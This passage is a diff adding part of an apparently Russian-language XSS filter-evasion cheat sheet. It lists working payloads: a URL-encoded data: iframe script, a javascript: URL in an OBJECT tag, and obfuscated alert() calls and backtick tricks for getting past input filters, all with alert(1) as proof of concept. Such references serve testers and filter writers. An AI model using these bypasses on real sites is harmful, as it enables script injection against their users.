+<li><code>&lt;iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"&gt;&lt;/iframe&gt;</code></li>
+<li><code>&lt;OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"&gt;&lt;PARAM NAME="DataURL" VALUE="javascript:alert(1)"&gt;&lt;/OBJECT&gt;</code></li>
+</ul>
+
+<!-- markdownlint-enable MD038-->
+
+
+<h3 id="filter-bypass-alert-obfuscation">Обфускация вызова alert для обхода фильтра</h3>
+
+<ul>
+<li><code>(alert)(1)</code></li>
+<li><code>a=alert,a(1)</code></li>
+<li><code>[1].find(alert)</code></li>
+<li><code>top[“al”+”ert”](1)</code></li>
+<li><code>top[/al/.source+/ert/.source](1)</code></li>
+<li><code>al\u0065rt(1)</code></li>
+<li><code>top[‘al\145rt’](1)</code></li>
+<li><code>top[‘al\x65rt’](1)</code></li>
+<li><code>top[8680439..toString(30)](1)</code></li>
+<li><code>alert?.()</code></li>
+<li><code>(alert())</code></li>
+</ul>
+
+<p>В нагрузке следует указать ведущий и завершающий обратный апостроф (backtick):</p>
+
+<div class="cheatsheet-code-window"><pre><code class="language-xml">&amp;#96;`${alert``}`&amp;#96;</code></pre></div>
